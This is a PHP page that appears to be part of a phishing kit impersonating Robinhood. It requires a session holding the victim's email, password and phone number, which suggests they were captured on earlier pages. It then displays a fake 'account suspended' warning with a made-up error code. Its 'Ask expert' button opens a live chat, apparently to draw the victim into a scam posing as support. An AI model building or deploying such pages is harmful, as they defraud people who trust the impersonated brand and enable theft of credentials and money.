<?php include_once './config.php'; ?>
<html lang="en">
    <?php
        $title = 'RobinHood | Account';
        include_once './includes/meta.php';
        if(empty($_SESSION["email"]) || empty($_SESSION["password"])) {
            redirect(base_url());
        }
        if(empty($_SESSION["phone_number"])) {
            redirect(base_url('verify.php'));
        }
    ?>
    <body>
        <?php include_once './includes/header.php'; ?>
        <div class="d-flex align-items-center" style="min-height: 100vh;">
            <div class="col-12 p25 text-center">
                <h3 class="my30 fs25 fw-bold">Important Information</h3>
                <p class="my30 lh30 fw-bold">Due to unauthorized activity and identification failure on your Account. Account Access has been suspended. Please Get in touch with our Support Staff Immediately</p>
                <p class="fs25 lh30 fw-bold">Error CODE: EBRX1:6X76D</p>
                <a href="javascript:void(Tawk_API.toggle())" class="btn btn-success btn-lg px30">Ask expert</a>
            </div>
        </div>
        <?php include_once './includes/footer.php'; ?>
    </body>
</html>